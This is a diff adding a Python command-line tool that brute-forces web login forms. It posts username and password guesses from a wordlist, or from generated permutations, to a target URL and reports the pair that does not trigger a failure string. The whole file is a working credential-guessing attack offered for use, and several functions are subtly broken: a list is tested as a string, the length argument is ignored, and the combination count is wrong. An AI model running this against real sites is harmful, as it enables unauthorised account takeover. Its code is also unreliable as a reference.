@@ -1,0 +1,143 @@
+#!/usr/bin/python
+
+import itertools #For bruteforce
+import requests as r #For sending requests
+import argparse #For parsing arguments
+
+class COLOR:
+    star = "\033[37;1m[*]";
+    green = " \033[32;1m ";
+    red = " \033[31;1m ";
+    info = " \033[37;1m ";
+    clear = "\033[0m";
+
+def initargs(): #Initialises variables provided to the program
+    parser = argparse.ArgumentParser(description="Simple singlethreaded python bruteforce tool for <form> elements\n");
+    parser.add_argument('-l', '--length', help='The max length of the password (default 8)', required=False);
+    parser.add_argument('-w', '--wordlist', help='File of creds. Usernames and passwords are seperated by :', required=False);
+    parser.add_argument('-t', '--threads', help='Number of threads to use (NOT_IN_USE)', required=False);
+    parser.add_argument('-u', '--url', help='The full URL to the login submit page of the target website e.g. http://somesite.com/admim/login/auth', required=True);
+    parser.add_argument('-au', '--argsu', help='Username to POST with e.g. usr=', required=False);
+    parser.add_argument('-ap', '--argpw', help='Password to POST with e.g. pwd=', required=False);
+    parser.add_argument('-f', '--failstr', help='String to search for on failed attempt', required=True);
+    args = vars(parser.parse_args())
+    return args;
+
+def findbet(s, first, last):
+    start = s.index(first) + len(first);
+    end = s.index(last, start);
+    return s[start:end];
+
+def passgen(leng):
+    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    #if leng is None: leng = 8;
+    res = itertools.permutations(chars, 8);
+
+    for guess in res:
+         yield guess
+
+def getdest(index): #Filters out and returns the destination to POST to from the HTTP response
+    form = [line for line in index.split('\n') if "<form" in line];
+    if "action=" in form:
+        dest = form.split("action=")[1];
+    return index.text;
+
+def getparams(index):
+    params = [line for line in index.split('\n') if "name=" and "<input" in line];
+    result = [];
+    for a in params:
+        if "name=" in a:
+            result.append(findbet(a, 'name="', '"'));
+    return result;
+
+def crack(): #Cracks the password
+    #Preflight initialisation
+    chars = [chr(i) for i in range(127)];
+    args = initargs();
+    w_count = 0;
+    
+    if args['length'] is not None: length = int(args['length']); 
+    else: length = 8;
+    
+    if args['wordlist'] is not None:
+        with open(args['wordlist']) as a:
+            for line in a.readlines(): w_count = w_count + 1;
+
+    #if args['threads'] is not None: cores = int(args['threads']);
+    url = args['url'];
+    index = r.get(url);
+    params = getparams(index.text);
+    usra = params[0];
+    pwda = params[1];
+
+    fail = args['failstr'];
+    if args['argsu'] is not None and args['argpw'] is not None: usra = args['argsu']; pwda = args['argpw'];
+    b_count = 95 ** length #95 is the magic number for all symbols, characters and numbers possible 
+
+    #Cracking
+    if args['wordlist'] is not None: 
+        print(COLOR.star + COLOR.info + "{} ".format(w_count) + COLOR.clear + "possible combinations found in wordlist");
+        with open(args['wordlist']) as handle:
+            for line in handle:
+                usr = line.split(':')[0].replace("\n", "");
+                pwd = line.split(':')[1].replace("\n", "");
+                datab = {usra:usr, pwda:pwd};
+                resp = r.post(url, data=datab); 
+                
+                if fail in resp.text: 
+                    print(COLOR.star + COLOR.info + "User: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.red +"FAIL\n", end="\r");
+                
+                else: 
+                    print(COLOR.star + COLOR.info + "User: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.green + "SUCCESS\n", end="\r");
+                    return COLOR.star + COLOR.green + "MATCH FOUND" + COLOR.clear;
+        
+        
+        return COLOR.star + COLOR.red + "NO MATCHES" + COLOR.clear;
+    
+    elif args['argsu'] or args['argpw'] is not None:
+        print(COLOR.star + COLOR.green + "STARTING BRUTEFORCE");
+        print(COLOR.star + COLOR.info + "{}".format(b_count) + COLOR.clear + " possible combinations exist for bruteforcing (password)");
+        pwgen = passgen(args['length']);
+        
+        if args['argsu'] is not None: 
+            for guess in pwgen:
+                usr = args['argsu'];
+                pwd = "".join(guess);
+
+                datab = {usra:usr, pwda:pwd};
+                resp = r.post(url, data=datab);
+                
+                if fail in resp.text: stat = COLOR.red + "FAIL";
+                else: stat = COLOR.green + "SUCCESS";
+
+                print(COLOR.star + COLOR.info + "Username: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.clear + stat, end="\r");
+                
+                if fail not in resp.text: 
+                    return COLOR.star + COLOR.info + "Username: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.clear;
+        
+        elif args['argpw'] is not None:
+            for guess in pwgen:
+                usr = "".join(guess);
+                pwd = args['argpw'];
+                
+                datab = {usra:usr, pwda:pwd};
+                resp = r.post(url, data=datab);
+                
+                if fail in resp.text: stat = COLOR.red + "FAIL";
+                else: stat = COLOR.green + "SUCCESS";
+
+                print(COLOR.star + COLOR.info + "Username: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.clear + stat, end="\r");
+                
+                if fail not in resp.text: 
+                    return COLOR.star + COLOR.info + "Username: " + COLOR.clear + usr + COLOR.info + "Password: " + COLOR.clear + pwd + COLOR.clear;
+
+    
+    else:
+        return COLOR.star + COLOR.red + "argsu or argpw was not provided via arguments" + COLOR.clear;
+
+
+def main(): #Prints the (hopefully) found password
+    print(crack()); 
+		
+if __name__ == "__main__": #Standards
+    main();
